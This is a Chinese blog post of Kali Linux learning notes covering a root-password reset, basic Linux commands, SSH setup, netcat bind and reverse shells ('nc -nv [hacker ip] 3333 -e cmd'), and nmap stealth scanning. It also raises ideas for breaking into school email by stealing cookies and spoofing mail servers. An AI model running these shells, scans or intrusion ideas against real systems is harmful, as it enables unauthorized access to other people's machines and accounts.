@@ -1,0 +1,636 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Kali完全攻略 | 逍 遥 の B l o g</title><meta name="keywords" content="kali,信息搜集,爆破,社工"><meta name="author" content="XiaoYao"><meta name="copyright" content="XiaoYao"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="tools">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali完全攻略">
+<meta property="og:url" content="https://w4xiaoyao.top/2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kali%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/">
+<meta property="og:site_name" content="逍 遥 の B l o g">
+<meta property="og:description" content="tools">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/015.jpg">
+<meta property="article:published_time" content="2023-03-30T13:01:15.562Z">
+<meta property="article:modified_time" content="2021-03-17T16:00:00.000Z">
+<meta property="article:author" content="XiaoYao">
+<meta property="article:tag" content="kali">
+<meta property="article:tag" content="tools">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/015.jpg"><link rel="shortcut icon" href="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img_struct4blog/favicon_hacker.png"><link rel="canonical" href="https://w4xiaoyao.top/2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kali%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"Author: XiaoYao","link":"Link: ","source":"Source: 逍 遥 の B l o g","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Kali完全攻略',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-18 00:00:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    })(window)</script><type="text/css" href="/css/mycss.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img_struct4blog/profile_knife.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">55</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">68</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archive</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw far fa-images"></i><span> Gallery</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> Game1</span></a></li><li><a class="site-page child" href="/gamee/"><i class="fa-fw fas fa-gamepad"></i><span> Game2</span></a></li><li><a class="site-page child" href="/gameee/"><i class="fa-fw fas fa-gamepad"></i><span> Game3</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/015.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">逍 遥 の B l o g</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archive</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw far fa-images"></i><span> Gallery</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> Game1</span></a></li><li><a class="site-page child" href="/gamee/"><i class="fa-fw fas fa-gamepad"></i><span> Game2</span></a></li><li><a class="site-page child" href="/gameee/"><i class="fa-fw fas fa-gamepad"></i><span> Game3</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Kali完全攻略</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-03-30T13:01:15.562Z" title="Created 2023-03-30 21:01:15">2023-03-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-03-17T16:00:00.000Z" title="Updated 2021-03-18 00:00:00">2021-03-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">5.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>18min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Kali完全攻略"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Kali基础"><a href="#Kali基础" class="headerlink" title="Kali基础"></a>Kali基础</h2><p>工具不是主力，脑子才是主力</p>
+<p>用编程语言自己写工具，而不是当脚本小子</p>
+<hr>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Linux安装不像windows，可以直接使用iso启用，对应linux安装有两种启动方式，install与live：</p>
+<p><strong>install：</strong>其实就是装到电脑中，好处包括可以存储东西到电脑中，方便升级等，坏处是方便被人取证。</p>
+<p><strong>live：</strong>linux是轻量级系统，可以直接放在u盘中启动，利用光盘镜像文件进行live方式启动，一切行为存储在内存中（断电消失，难以取证）如果要额外存储东西，需要另外存到u盘中。     （tips：打造手机kali）</p>
+<p><strong>vps部署kali</strong>：<a target="_blank" rel="noopener" href="http://old.kali.org/">http://old.kali.org</a> 可用sha256校验，cmd自带命令certutil -hashfile 文件名 md5 sha256等</p>
+<p>Kali从2020开始不支持root为基本账户，所以root密码原先的toor密码不再可以登录进去，每次只能以普通用户kali登录，权限少到连基本的reboot，shutdown都无，进入单例模式修改root密码，默认无具体见 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ph1sh/p/12241482.html">https://www.cnblogs.com/ph1sh/p/12241482.html</a>  </p>
+<blockquote>
+<p>步骤：</p>
+<p>重启，5秒内按E，光标向下移到linux开头行，下一行的ro改为rw，再移到该行最后写<strong>init=/bin/bash</strong>，确保最后是rw quiet splash init=/bin/bash</p>
+<p>ctrl+c进入单例模式，<strong>passwd root</strong>输入两次新密码即可</p>
+</blockquote>
+<p>kali2020版本之后，用户名与密码默认kali，之前，默认用户名root，密码toor</p>
+<hr>
+<h3 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h3><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><p>$普通用户权限，#root权限，机器与人类可用最高权限</p>
+<p>sudo提权命令，默认2020以上没有密码</p>
+<p>kali自带的是火狐内核浏览器</p>
+<p>ifconfig 查看ip地址</p>
+<p>pwd查看当前路径</p>
+<p>cd .. 退一格，linux中，/是最上层目录</p>
+<p>ls查看当前目录</p>
+<p>ls -la查看当前目录详细信息</p>
+<p>d    rwx    r-w    r-x    13    root    root    0    Nov    3    11:22    sys</p>
+<p>d文件夹</p>
+<p>.和..是默认都有的目录，每个文件夹中都有；</p>
+<p>-文件；</p>
+<p>l链接(类似快捷方式)</p>
+<p>r = read = 4；w = write = 2；x = execute = 1，755就是上面的3种权限，第一个权限是所有者权限，第二个权限=所有者所在组的权限，跟所有者在同一个组的其他人的权限，第三个权限=其他人权限</p>
+<p>第一个root位置，文件的所有者是root，第二个root位置：这个文件的所有者所在的组是什么组；</p>
+<p>最后sys位置=文件名</p>
+<p>rwxr–r-x：745</p>
+<p>mkdir test 新建文件夹，文件名是test</p>
+<p>touch 1.txt 新建文件1.txt</p>
+<p>vi 1.txt 使用vi编辑器去编辑1.txt</p>
+<p>vi是一个命令行编辑器，按下i进入insert模式</p>
+<p>esc（按下esc进入命令行）：wq 保存退出 ：q！不保存退出</p>
+<p>cat 1.txt 看一下里面的内容；tac 1.txt 从后向前看内容</p>
+<p>cp 【被复制的文件】 【复制到的位置】 复制</p>
+<p>mv 【被剪切的文件】 【粘贴到的位置】剪切/改名 如果两个位置都是文件名，相当于把第一个文件改为第二个文件名</p>
+<p>rm 【目标】删除</p>
+<p>rm -rf 【目标】强行删除文件夹和其中的文件并不询问</p>
+<p>rm -rf /* 危险命令，这里/表示根目录，*表示所有</p>
+<p>find【在哪个地方查找】 -name【要查找的文件名】 找东西</p>
+<p>find ./ -name test，这里./表示当前目录下，find / -name 1.txt相当于在/根目录下寻找，即全局搜索</p>
+<p>ps 查看进程，查看当前普通进程</p>
+<p>ps-ef 查看所有进程</p>
+<p>top查看动态进程，ctrl+c结束</p>
+<p>ps -ef | grep [条件] 筛选符合条件的进程</p>
+<p>ps -ef | grep bash 在所有进程中查看名字叫bash的</p>
+<p>| = 管道符，把左边的命令执行结果传给后面</p>
+<p>echo 回显</p>
+<p>echo haha &gt; 1.txt 在1.txt中覆盖写入haha</p>
+<p>echo haha &gt;&gt;1.txt 在1.txt中换行追加内容</p>
+<p>uname 查看操作系统  -a详细信息</p>
+<p>chmod [权限的数字] [目标文件]  修改权限</p>
+<p>chmod 755 -R [文件夹] 修改文件夹内所有东西的权限</p>
+<h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><p>linux系统中防火墙是iptables</p>
+<p>考虑版本差异</p>
+<p>service iptables start/stop</p>
+<p>永久关闭  chkconfig iptable on/off</p>
+<p>passwd 修改密码</p>
+<h3 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h3><p>bitvise软件好用</p>
+<p>vi /etc/ssh/sshd_config    修改ssh的配置文件，这里是sshd文件</p>
+<ul>
+<li><p>去掉port 22之前的注释号#</p>
+</li>
+<li><p>permitrootlogin取消注释 同时改为yes</p>
+</li>
+<li><p>pubkeyauthentication yes</p>
+</li>
+</ul>
+<p>修改之后esc退到命令模式，用 :wq!退出，2020后版本默认无root权限，见上面安装部分修改root密码登录账户</p>
+<p><strong>新版</strong>（ubuntu15,centos7之后）linux用 systemctl restart ssh/sshd 重启ssh  重启后netstat -tplugn查看22号端口已开放</p>
+<p><strong>旧版</strong>：/etc/init.d/ssh restart    （这是指定目录下的某个文件重启，不是到该目录下用ssh restart  </p>
+<p>kali106版本默认ssh已配置好，用etc/init.d/ssh start启动</p>
+<p>之后使用bitvise连接（这才是正经操作）</p>
+<p>关闭kali： shutdown -h now</p>
+<h3 id="修改更新源"><a href="#修改更新源" class="headerlink" title="修改更新源"></a>修改更新源</h3><p>linux去哪下载包？</p>
+<p>apt-get install beef   linux是最早产生应用商店的概念的地方，apt可以理解为应用商店，从此处get，然后install一个叫beef的软件</p>
+<p>/etc/apt/sources.list   更新源，可以调整为aliyun的</p>
+<p>更新源之后需要 apt-get update 对系统进行更新，重新更改更新源</p>
+<p>一般2019之后的kali没有beef软件，安装apt-get install beef-xss</p>
+<hr>
+<h3 id="nc-netcat"><a href="#nc-netcat" class="headerlink" title="nc(netcat)"></a>nc(netcat)</h3><p>微软觉得cmd的权限和可以做的事情太少了，于是有了powershell，hacker最终目标是控制目标电脑的cmd/powershell</p>
+<p>在linux世界，使用什么控制win的命令行？</p>
+<p>nc（瑞士军刀，短小精悍）开源，跨平台，kali自带，kali也有netcat</p>
+<p>功能丰富，远程通信，控制，加密通信，配合自解压还可以变成小马等操作</p>
+<h4 id="发送普通文字"><a href="#发送普通文字" class="headerlink" title="发送普通文字"></a>发送普通文字</h4><p>服务端（被黑的）：</p>
+<p>nc .exe -l -p 4444   监听从4444端口走的信息</p>
+<p>客户端：</p>
+<p>nc -nv [服务端ip] 4444</p>
+<blockquote>
+<p>win10 无法访问问题</p>
+<p>尝试更新版本，nc2019的应该可以在win7上，win10无法访问。</p>
+<p>暂时没找到新的，原来是360不给访问，关了360就行，可以尝试自己写一个nc</p>
+<p>关于nc的其他使用方法 <a target="_blank" rel="noopener" href="https://blog.csdn.net/earbao/article/details/49633789">https://blog.csdn.net/earbao/article/details/49633789</a></p>
+</blockquote>
+<h4 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h4><p>正向连接：比如黑客主动连接目标主机，</p>
+<p>目标主机： nc -lp 3333 -e cmd  如果有人连接我3333端口，就把cmd返还给这个人，这里-lp相当于-l -p的混合写法，l=listen，p=port，e=执行什么</p>
+<p>hacker：nc -nv [目标ip] 3333</p>
+<p>反向连接：目标主机主动去连接黑客，比如域名，木马主动去找黑客</p>
+<p>hacker： nc -lp 3333</p>
+<p>目标主机： nc -nv [hacker ip] 3333 -e cmd</p>
+<p>如果是linux，就是 -e bash，不是-e cmd</p>
+<p>（将nc做成自解压文件，改造，使用自解压文件执行cmd命令，其实就是一个小远控）</p>
+<h3 id="OS外的信息搜集"><a href="#OS外的信息搜集" class="headerlink" title="OS外的信息搜集"></a>OS外的信息搜集</h3><h4 id="扫描器nmap"><a href="#扫描器nmap" class="headerlink" title="扫描器nmap"></a>扫描器nmap</h4><p>全世界最厉害的扫描器？</p>
+<blockquote>
+<p>内网主机发现，</p>
+<p>端口扫描（端口上一般对应什么服务，不同服务版本可能存在不同漏洞），</p>
+<p>版本侦测，</p>
+<p>OS指纹识别（不同版本OS补丁的入侵方式不同）</p>
+</blockquote>
+<p><strong>nmap [目标ip] 普通扫描（Tcp）</strong>  <strong>135</strong>（135端口就是用于远程的打开对方的telnet服务，用于启动与远程计算机的RPC 连接，很容易就可以就侵入电脑。大名鼎鼎的“冲击波”就是利用135端口侵入的。 ）和<strong>445</strong>（445端口是一种TCP端口，该端口在windows 2000 Server或Windows Server 2003系统中发挥的作用与139端口是完全相同的。 具体地说，它可以提供局域网中文件或打印机共享服务。 … 同样地，攻击者与445端口建立请求连接，也能获得指定局域网内的各种共享信息。）端口比较忌讳，在内网的话可以直接干掉</p>
+<p><strong>nmap 192.168.1.0/24</strong> 或者192.168.1**.1-255**  扫描范围为192.168.1.1~192.168.1.255这个范围内所有</p>
+<p><strong>-sT</strong>  <strong>tcp端口扫描</strong>， 普通扫描（<strong>默认</strong>）但是该方法很容易被防火墙识别，因为这是基于tcp的3次握手4次挥手的，扫描目标主机开放了哪些端口</p>
+<p><strong>-sS</strong> <strong>隐秘扫描</strong>（不形成三次握手，不建立tcp连接）在目标主机上留下不多的日志信息</p>
+<p><strong>-sU</strong> 使用<strong>udp扫描</strong> 很多时候tcp对于防火墙很敏感，容易被发现，但是udp不可靠协议</p>
+<p><strong>-PU</strong> 同上，使用UDP扫描，nmap会发送一个空的报文到主机，若是返回则说明设备在线。一般咱们只须要添加-PU便可实现udp扫描。</p>
+<hr>
+<p><strong>-sL</strong> 192.168.1.1-255  使用list scan<strong>扫描整个网段</strong>，主要用于主机发现（实测可被摄像头屏蔽）</p>
+<p><strong>-p [指定端口]</strong> 如 nmap -p 100-200,3306 192.168.1.252</p>
+<p><strong>-sn</strong> ping scan（ping扫描），<strong>只发现</strong>主机，<strong>不扫描端口</strong>，有时候上面扫描命令会引起怀疑，但是用ping可能不会引起怀疑，有时候ping不一定准，当网络卡的时候。阻止ping的方式，在防火墙上把ping功能禁用掉就可以装死了（实测可看到海康威视摄像头，honor疑似屏蔽此项）</p>
+<p><strong>-Pn</strong> 假定所有主机都是开机的，<strong>跳过发现</strong>过程。有的防火墙设计公司在侦测到被扫描的阶段就把威胁干掉，所以避免被发现很重要</p>
+<p> <strong>-sP</strong> 172.16.88.0/24 <strong>Ping扫描</strong>172.16.88.0/24网段上有哪些主机是存活的</p>
+<p><strong>-P0</strong> 使用ip探测协议探测主机是否开启，<strong>无ping扫描</strong>，ping扫描虽然简单，可是当开启了禁ping后，以上方法便行不通了。这时咱们即可以用无ping扫描。</p>
+<p><strong>-PR</strong> ARP扫描，ARP扫描是nmap对目标进行一个<strong>apr ping扫描</strong>的过程，尤为在内网的状况下。由于在本地局域网防火墙是不会禁止ARP请求的。因此在内网中使用apr扫描时很是有效的。</p>
+<p><strong>-O</strong> 识别操作系统，根据OS指纹猜OS是啥</p>
+<p>其中os <strong>cpe</strong>显示的是nmap<strong>猜测</strong>的系统</p>
+<blockquote>
+<p>维基百科扩展</p>
+<ul>
+<li>全面进攻性扫描（包括各种主机发现、端口扫描、版本扫描、OS扫描及默认脚本扫描）:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v target_ip</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Ping扫描:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -v target_ip</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>快速端口扫描:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -v target_ip</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>版本扫描:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -v target_ip </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>操作系统扫描:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -v target_ip</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>运行标记为safe的nse script</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -v target_ip</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="提高nmap扫描效率"><a href="#提高nmap扫描效率" class="headerlink" title="提高nmap扫描效率"></a>提高nmap扫描效率</h4><blockquote>
+<p>各参数的含义<br>-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了，具体自己百度了解</p>
+<p>-Pn： 禁用PING检测</p>
+<p>-p： ports，要检测的端口号，比如80</p>
+<p>-n： 功能未知，在V2EX上看到的</p>
+<p>–open： 只输出检测状态为open的端口，即开放的端口，参考文章《快速高效:Nmap结果整理方法》</p>
+<p>–min-hostgroup 1024：调整并行扫描组的大小，参考文章《详尽的Nmap扫描参数解析》</p>
+<p>–min-parallelism 1024：调整探测报文的并行度</p>
+<p>–host-timeout 30：检测超时的跳过</p>
+<p>-T4：总共有T0-T5，貌似T4比较折中，参考文章《Nmap参考指南：十一、 时间和性能》</p>
+<p>-v：打印详细扫描过程</p>
+<p>-oG：输出为比较人性化的格式，一条记录一行，后期好处理</p>
+<p>-iL：载入ip段文件，批量扫，不用一条条执行了。</p>
+</blockquote>
+<p>方法二</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -Pn -p 80 -n --open --min-hostgroup 1024 --min-parallelism 10 --host-timeout 30 -T4 -v -oG results-all.txt -iL ipduan.txt</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>各参数的含义：</p>
+<p>-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了，具体自己百度了解</p>
+<p>-Pn： 禁用PING检测</p>
+<p>-p： ports，要检测的端口号，比如80</p>
+<p>-n： 功能未知，在<a target="_blank" rel="noopener" href="https://seofangfa.com/goto/https://www.v2ex.com/t/269579">V2EX上看到的</a></p>
+<p>–open： 只输出检测状态为open的端口，即开放的端口，参考文章<a target="_blank" rel="noopener" href="https://seofangfa.com/other-note/nmap-jiasu.html">《快速高效:Nmap结果整理方法》 </a></p>
+<p>–min-hostgroup 1024：调整并行扫描组的大小，参考文章<a target="_blank" rel="noopener" href="https://seofangfa.com/other-note/nmap-canshu.html">《详尽的Nmap扫描参数解析》 </a></p>
+<p>–min-parallelism 1024：调整探测报文的并行度</p>
+<p>–host-timeout 30：检测超时的跳过 </p>
+<p>-T4：总共有T0-T5，貌似T4比较折中，参考文章<a target="_blank" rel="noopener" href="https://seofangfa.com/goto/https://wizardforcel.gitbooks.io/nmap-man-page/content/11.html">《</a><a target="_blank" rel="noopener" href="https://seofangfa.com/goto/https://wizardforcel.gitbooks.io/nmap-man-page/content/11.html">Nmap参考指南：十一、 时间和性能》</a></p>
+<p>-v：打印详细扫描过程</p>
+<p>-oG：输出为比较人性化的格式，一条记录一行，后期好处理</p>
+<p>-iL：载入ip段文件，批量扫，不用一条条执行了。</p>
+<p>以上参考：<a target="_blank" rel="noopener" href="https://seofangfa.com/other-note/nmap-tishu.html">https://seofangfa.com/other-note/nmap-tishu.html</a></p>
+</blockquote>
+<p>知道系统版本信息后</p>
+<p>exploit-db.com 墙外浏览 或者 github搜索ms17010</p>
+<hr>
+<p>学技术时需要思考的问题：</p>
+<p>为什么，什么时候用？</p>
+<p>有些学校，作业发邮件，邮箱密码如何破解，抓到目标 电脑的指定网页邮箱cookie，实现免密码登录</p>
+<p>有的学校指定软件或系统，这种情况漏洞出现的概率更大，压力测试，dns，arp欺骗伪造邮件服务器的环境，</p>
+<p>学校，公司邮件服务器，主服务器信息如何探测，主服务器的密码如何获取？</p>
+<h2 id="Kali工具使用"><a href="#Kali工具使用" class="headerlink" title="Kali工具使用"></a>Kali工具使用</h2><p>kali=有攻击工具的linux系统</p>
+<p>parrot也挺好</p>
+<p>2019之后用户名密码都是kali，之前是root和toor</p>
+<p>默认不给root账号，sudo passwd root 创建root账号密码 live模式下重启需要重新创建</p>
+<hr>
+<p>关闭自动补全功能</p>
+<p><strong>chsh</strong> 更改shell设定</p>
+<p>输入密码后输入**/bin/bash**</p>
+<p>shutdown -r now 重启</p>
+<hr>
+<p>使用root权限</p>
+<p>sudo +命令</p>
+<p>切换root ： sudu su </p>
+<p>passwd 给root账户设置密码</p>
+<p>exit退回原来权限</p>
+<hr>
+<p><strong>uname -a</strong>   发现kali是基于debian，所以使用apt-get update/upgreat 更新软件</p>
+<p><strong>clear</strong> 清空当前终端屏幕</p>
+<hr>
+<p>kali自带内部web服务器  <strong>/var/www/html/</strong></p>
+<p><strong>service apache2 start</strong> </p>
+<p><strong>rm -rf ./*</strong>    remove -recursive（循环递归） -force ./当前目录（/是根目录，危险命令）  *所有</p>
